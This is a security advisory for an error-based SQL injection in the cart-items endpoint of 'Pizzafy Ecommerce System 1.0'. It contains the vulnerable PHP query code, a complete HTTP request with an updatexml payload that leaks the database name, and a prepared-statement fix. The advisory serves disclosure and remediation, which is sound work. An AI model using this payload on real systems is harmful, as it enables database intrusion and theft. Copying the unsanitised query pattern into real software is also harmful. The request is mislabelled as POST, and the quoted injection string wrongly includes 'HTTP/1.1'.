
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `/pizzafy/admin/ajax.php?action=get_cart_items&id=1`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains multiple critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in SELECT Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **select functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `user_id` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
public function get_cart_items() {
    if(!isset($_SESSION['login_user_id'])) {
        return ['items' => []];
    }
    
    $user_id = $_SESSION['login_user_id'];
    
    if (isset($_GET['id'])) {
        $user_id = $_GET['id'];            
    }
    
    $sql = "SELECT c.id as cart_id, c.product_id, c.qty, p.name, p.price 
            FROM cart c 
            JOIN product_list p ON c.product_id = p.id 
            WHERE c.user_id = $user_id";
    
    $result = $this->conn->query($sql);    
    
    if (!$result) {    
        return ['items' => [], 'error' => $this->conn->error];
    }

    $items = [];
    $total = 0;
    
    if($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $subtotal = $row['price'] * $row['qty'];
            $total += $subtotal;
            $items[] = [
                'cart_id' => $row['cart_id'],
                'product_id' => $row['product_id'],
                'name' => $row['name'],
                'qty' => $row['qty'],
                'price' => (float)$row['price'],
                'subtotal' => (float)$subtotal
            ];
        }
    }
    
    return ['items' => $items, 'total' => $total];
}
```

Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  

```
GET /pizzafy/admin/ajax.php?action=get_cart_items&id=6%20AND%20updatexml(1,concat(0x7e,database()),1)%23 HTTP/1.1
Host: localhost
sec-ch-ua: 
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizzafy/index.php?page=home
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=jeku15623h3gva8eql2jpr5g4i
Connection: close
```

### **Explanation:**  
This payload injects the SQL command:  

```sql
id=6%20AND%20updatexml(1,concat(0x7e,database()),1)%23 HTTP/1.1
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/msngkG7.png)
---

## Remediation
```php
public function get_cart_items() {
    if(!isset($_SESSION['login_user_id'])) {
        return ['items' => []];
    }
    
    $user_id = (int)$_SESSION['login_user_id'];
    
    // Remove the code
    // if (isset($_GET['id'])) {
    //     $user_id = $_GET['id'];            
    // }
    
 
    $stmt = $this->conn->prepare("SELECT c.id as cart_id, c.product_id, c.qty, p.name, p.price 
                                  FROM cart c 
                                  JOIN product_list p ON c.product_id = p.id 
                                  WHERE c.user_id = ?");
    $stmt->bind_param("i", $user_id);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if (!$result) {    
        error_log("Erro em get_cart_items: " . $this->conn->error);
        return ['items' => []];
    }

    $items = [];
    $total = 0;
    
    if($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $subtotal = $row['price'] * $row['qty'];
            $total += $subtotal;
            $items[] = [
                'cart_id' => $row['cart_id'],
                'product_id' => $row['product_id'],
                'name' => $row['name'],
                'qty' => $row['qty'],
                'price' => (float)$row['price'],
                'subtotal' => (float)$subtotal
            ];
        }
    }
    
    return ['items' => $items, 'total' => $total];
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `id` parameter and `id` column to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet
